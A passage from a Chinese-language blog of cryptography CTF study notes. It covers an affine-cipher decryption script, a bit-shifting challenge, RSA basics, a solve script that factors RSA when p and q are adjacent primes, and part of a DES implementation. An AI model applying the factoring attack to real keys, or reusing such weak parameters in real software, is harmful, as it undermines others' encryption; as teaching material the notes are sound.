class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, a_invert, b, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([a_invert*(i   - b) % m <span class="keyword">for</span> i <span class="keyword">in</span> cipher])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message, a, b, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(<span class="built_in">ord</span>(i) * a + b) % m <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;&#x27;</span></span><br><span class="line"><span class="comment"># 计算密钥a，b</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> encrypt(flag, a, b, m) <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> <span class="comment"># print(a, b)</span></span><br><span class="line">m = <span class="number">1</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">a = <span class="number">13</span> </span><br><span class="line">b = <span class="number">131</span></span><br><span class="line"><span class="comment"># 计算a的逆元函数</span></span><br><span class="line">a_invert = gmpy2.invert(<span class="number">13</span>,<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a_invert = &#x27;</span>, a_invert)</span><br><span class="line">m = decrypt(c,a_invert,b,m)</span><br><span class="line"><span class="built_in">print</span>(m.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="littleprince-同余方程，中国剩余定理"><a href="#littleprince-同余方程，中国剩余定理" class="headerlink" title="littleprince(同余方程，中国剩余定理)"></a>littleprince(同余方程，中国剩余定理)</h2><p>这道题的给的加密代码有一些难理解，在这里记录一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">a, b, c</span>):</span><br><span class="line">  <span class="comment"># 1 &lt;&lt; b 表示将数字 1 左移 b 位，即得到一个只有第 b 位为1，其余位都为0的整数</span></span><br><span class="line">    <span class="comment"># 例如，如果 b 等于 3，那么 1 &lt;&lt; b 就等于二进制数 0b1000，也就是十进制数 8</span></span><br><span class="line"><span class="comment"># 对结果 1 &lt;&lt; b 减去 1，这样得到的二进制数将会是从第 0 位到第 b-1 位都是1，其余位都是0</span></span><br><span class="line"><span class="comment"># 以 b 等于 3 为例，((1 &lt;&lt; 3) - 1) 将得到二进制数 0b111，也就是十进制数 7</span></span><br><span class="line"><span class="comment"># 最后，我们将 a 和上述得到的结果进行按位与操作 &amp;，这样就会保留 a 的低 b 位，将其余高位都置为0</span></span><br><span class="line">    <span class="comment"># a的低b位的掩码在这里保留a的最后b位置，其他位置设为0</span></span><br><span class="line">    <span class="comment"># 它将这两个结果进行位或操作 | 并将低 c - b 位左移</span></span><br><span class="line">    <span class="comment"># 目的是对a进行加密并且返回</span></span><br><span class="line">    <span class="keyword">return</span> a &gt;&gt; b | (a &amp; ((<span class="number">1</span> &lt;&lt; b)-<span class="number">1</span>)) &lt;&lt; (c-b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outp</span>(<span class="params">x, h</span>):</span><br><span class="line">    p = randint(<span class="number">1</span> &lt;&lt; h, <span class="number">1</span> &lt;&lt; h+<span class="number">1</span>)</span><br><span class="line">    q = randint(<span class="number">1</span> &lt;&lt; h, <span class="number">1</span> &lt;&lt; h+<span class="number">1</span>)</span><br><span class="line">    c1, c2 = x % p, x % q</span><br><span class="line">    <span class="built_in">print</span>(p, q, c1, c2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag 转成长整数m</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="comment"># 计算m的二进制位数</span></span><br><span class="line">m_len = m.bit_length()</span><br><span class="line">d, h, st = <span class="number">32</span>, <span class="number">16</span>, <span class="number">32</span></span><br><span class="line">r = m_len % d</span><br><span class="line"><span class="keyword">assert</span> (r &gt; h)</span><br><span class="line"><span class="keyword">while</span> st &lt;= m_len:</span><br><span class="line">    <span class="comment"># 对m进行加密</span></span><br><span class="line">    x = enc(m, st, m_len)</span><br><span class="line">    x &gt;&gt;= (m_len-d)</span><br><span class="line">    <span class="comment"># 输出加密结果</span></span><br><span class="line">    outp(x, h)</span><br><span class="line">    st += d</span><br><span class="line"><span class="comment"># 对 m 进行额外的加密操作，并通过 outp 函数输出最终的加密结果</span></span><br><span class="line">m &gt;&gt;= (m_len-r)</span><br><span class="line">outp(m, h)</span><br></pre></td></tr></table></figure><h3 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h3><blockquote><p>在计算机科学中，”掩码”（Mask）是一个用于屏蔽或提取某些位的二进制模式。掩码通常是一个与目标数据进行按位与操作的值，通过这种操作，可以将目标数据的某些位设置为0或从中提取出感兴趣的位。</p><p>掩码在计算机编程和计算机系统中有广泛的应用，主要用于以下两个方面：</p><ol><li>屏蔽位：掩码可以用于屏蔽目标数据的特定位。通过将目标数据与相应的掩码进行按位与操作，可以将不需要的位设置为0，而保留需要的位。这在编程中常用于清除或保留特定标志位，或者过滤掉数据中不需要的部分。</li><li>提取位：掩码还可以用于从目标数据中提取出感兴趣的位。通过将目标数据与相应的掩码进行按位与操作，可以将目标数据的其他位设置为0，而保留感兴趣的位。这在计算机系统中常用于从寄存器或数据中提取出特定字段或标志位。</li></ol><p>掩码通常使用二进制形式表示，并且每个位都对应于目标数据的相应位。在掩码中，1 表示需要保留或提取的位，0 表示需要屏蔽的位。</p><p>例如，对于目标数据 <code>11010110</code>，如果我们希望屏蔽掉低三位，我们可以使用掩码 <code>11111000</code>，通过进行按位与操作，结果将是 <code>11010000</code>。同样，如果我们希望提取低四位，我们可以使用掩码 <code>00001111</code>，通过进行按位与操作，结果将是 <code>00000110</code>。</p><ul><li>总结：与运算取出感兴趣的位，感兴趣为1，不感兴趣为0</li></ul></blockquote><h3 id="关于移位"><a href="#关于移位" class="headerlink" title="关于移位"></a>关于移位</h3><blockquote><p>a &gt;&gt; b | (a &amp; ((1 &lt;&lt; b)-1)) &lt;&lt; (c-b)</p><p>假设 <code>a</code> 等于 87 （二进制：<code>0b1010111</code>），<code>b</code> 等于 4。</p><ol><li><code>1 &lt;&lt; b</code> 的结果为 <code>0b10000</code>，也就是十进制数 16。</li><li><code>((1 &lt;&lt; b) - 1)</code> 的结果为 <code>0b1111</code>，也就是十进制数 15。</li><li><code>a &amp; ((1 &lt;&lt; b) - 1)</code> 就是 <code>0b1010111 &amp; 0b1111</code>，结果为 <code>0b111</code>，也就是十进制数 7。</li></ol><p>所以，<code>(a &amp; ((1 &lt;&lt; b) - 1))</code> 表达式的结果就是 <code>a</code> 的低 <code>b</code> 位的掩码，它将保留 <code>a</code> 二进制表示中的最后 <code>b</code> 位，并将其他位设置为0。</p></blockquote><h1 id="RSA系列"><a href="#RSA系列" class="headerlink" title="RSA系列"></a>RSA系列</h1><h2 id="RSA原理"><a href="#RSA原理" class="headerlink" title="RSA原理"></a>RSA原理</h2><p>生成数字</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230724151309040.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230724151309040.png"  class="" lazyload></a><p>加密与解密</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230724151346417.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230724151346417.png"  class="" lazyload></a><h2 id="RSA-Py代码实现"><a href="#RSA-Py代码实现" class="headerlink" title="RSA Py代码实现"></a>RSA Py代码实现</h2><p>Python代码的计算过程</p><ol><li><p>导入子库生成两个大素数，512bit朝</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># getPrime函数，它能够返回一个n位的素数</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure></li><li><p>计算欧拉函数和n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li><li><p>选取e判断互素性，并且计算逆元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">assert GCD(e, phi) == 1, &quot;该e不满足互素条件&quot;</span><br><span class="line">d = inverse(e, phi)</span><br></pre></td></tr></table></figure></li><li><p>加密hello</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里定义的是byte类型的字符串，每个字符用8位的二进制进行存储，如果直接定义字符串hello，字符串类型需要进行编码字节类型才可以进行加密</span></span><br><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># 使用的bytes_to_long函数，将字符串转换为数字</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 消息已经被转换为一个字符串了，可以加密</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure></li><li><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span>, <span class="string">&quot;该e不满足互素条件&quot;</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;公钥：(<span class="subst">&#123;e&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;私钥：(<span class="subst">&#123;d&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;消息：&#x27;</span>, m)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密文：&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;明文：&#x27;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> msg == m, <span class="string">&quot;解密失败&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="RSA类型"><a href="#RSA类型" class="headerlink" title="RSA类型"></a>RSA类型</h2><h3 id="p-q过小差值小类型"><a href="#p-q过小差值小类型" class="headerlink" title="p-q过小差值小类型"></a>p-q过小差值小类型</h3><p>题目代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 特征</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里一个特征就是，p通过函数生成512位的素数，然后q为其相邻的下一个素数，可以进行测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line"><span class="built_in">print</span>(q-p)</span><br></pre></td></tr></table></figure><p>解题原理</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230801080504699.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230801080504699.png"  class="" lazyload></a><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n =</span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">sn = gmpy2.isqrt(n)</span><br><span class="line">q = gmpy2.next_prime(sn)</span><br><span class="line">p = n // q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="费马分解"><a href="#费马分解" class="headerlink" title="费马分解"></a>费马分解</h3><h1 id="对称密码系列"><a href="#对称密码系列" class="headerlink" title="对称密码系列"></a>对称密码系列</h1><p>定义：对称加密，称为对称密码,是指在加密和解密时使用同一密钥得加密方式。</p><p>特点：比非对称加密要快</p><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p>典型的块加密，将明文分块加密</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>在DES中，具有如下特点</p><ol><li>输入<code>64</code>位</li><li>输出<code>64</code>位</li><li>密钥<code>64</code>位，使用<code>64</code>位密钥中的<code>56</code>位，剩余的<code>8</code>位要么丢弃，要么作为奇偶校验位</li><li>采用Feistel迭代结构：<ol><li>明文经过 16 轮迭代得到密文</li><li>密文经过类似的 16 轮迭代得到明文</li></ol></li></ol><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><h4 id="初始IP置换"><a href="#初始IP置换" class="headerlink" title="初始IP置换"></a>初始IP置换</h4><ul><li>64位明文分组<strong>X</strong>经过一个初始置换函数<code>IP</code>，产生64位的输出<strong>X0</strong>，再将分组<strong><em>X</em>0</strong>分成左半部分<em>L</em>0和右半部分<strong><em>R</em>0</strong>。<ol><li>将输入的第58位换到第一位，第50位换到第2位，…，依次类推。</li><li><em>L</em>0、<em>R</em>0则是换位输出后的两部分， <em>L</em>0是输出的左32位， <em>R</em>0是右32位。</li></ol></li><li>简而言之，这就是打乱了明文之间的排列，我们使用Python来实现这个函数，在这里及后续的代码中，我们都将明文认为是一个数字数组进行操作。</li></ul><h4 id="获取子密钥"><a href="#获取子密钥" class="headerlink" title="获取子密钥"></a>获取子密钥</h4><ul><li>在进入第一轮之前，我们还需要对密钥进行处理生成子密钥，每一轮将使用不同的子密钥参与运算。DES加密算法的密钥长度为56位，一般表示为<code>64</code>位(每个第<code>8</code>位用于奇偶校验)，将用户提供的<code>64</code>位初始密钥经过一系列的处理得到K1,K2,…,K16，分别作为1~16轮运算的16个子密钥。<ol><li><p>将64位密钥去掉8个校验位，用密钥置换PC-1置换身下的56位密钥</p></li><li><p>将56位分成前28位和后28位</p></li><li><p>根据轮数，将这两部分别循环左移1位或2位</p></li><li><p>移动后，将两部分合成56位后压缩置换PC-2后得到48位子密钥</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230805104413348.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230805104413348.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230805104756151.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230805104756151.png"  class="" lazyload></a></li></ol></li></ul><h4 id="密码函数F"><a href="#密码函数F" class="headerlink" title="密码函数F"></a>密码函数F</h4><ul><li><p>密码函数F的作用是将输入的32比特数据和48比特子密钥进行加密输出32比特</p><ol><li>扩展置换E：将数据的右半部分<code>Ri</code>从32位扩展为48位。位选择函数(也称E盒)</li><li>异或：扩展后的48位输出<code>E(Ri)</code>与压缩后的48位密钥Ki作异或运算</li><li>S盒替换：将异或得到的48位结果分成八个6位的块，每一块通过对应的一个S盒产生一个4位的输出</li><li>P盒置换：将S盒得到的输出再和<code>P</code>盒进行置换操作<a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230804174930102.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230804174930102.png"  class="" lazyload></a></li></ol></li></ul><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="comment"># operator这个库提供了一组函数，用于执行Python内置运算符的操作。它允许您以函数的形式使用像加法、减法、乘法等运算符，从而使您能够以更灵活的方式操作数据。例如，add()函数允许您将两个数字相加，而不是使用+运算符</span></span><br><span class="line"><span class="comment"># typing提供了在Python中进行类型提示(type hinting)的功能。允许开发者在函数参数、返回值和变量上添加类型注释。</span></span><br><span class="line"><span class="comment"># 这个库提供了一些函数式编程工具，它们可以让您更轻松地处理函数和操作。其中最常用的函数是reduce()，它可以对一个序列中的元素应用某个二元函数，并返回一个最终的聚合结果</span></span><br><span class="line">_IP = [</span><br><span class="line">    <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line"><span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line"><span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line"><span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,  <span class="number">0</span>,</span><br><span class="line"><span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># 这里的plain：List[int]是类型注释，代表plain的参数应该是一个整数列表 但注意，这只是一种提示，并不是强制执行这些类型</span></span><br><span class="line"><span class="comment"># map用于可迭代对象中每个元素给定的函数</span></span><br><span class="line"><span class="comment"># lambda 匿名函数 参数x，返回plain[x]</span></span><br><span class="line"><span class="comment"># 函数功能介绍，将_IP中每个元素作为索引x获取plain[x] </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IP</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: plain[x], _IP))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取子密钥</span></span><br><span class="line"><span class="comment"># 置换56位密钥的pc-1置换表</span></span><br><span class="line">__pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>,  <span class="number">8</span>,</span><br><span class="line">  <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,</span><br><span class="line">  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>,</span><br><span class="line"> <span 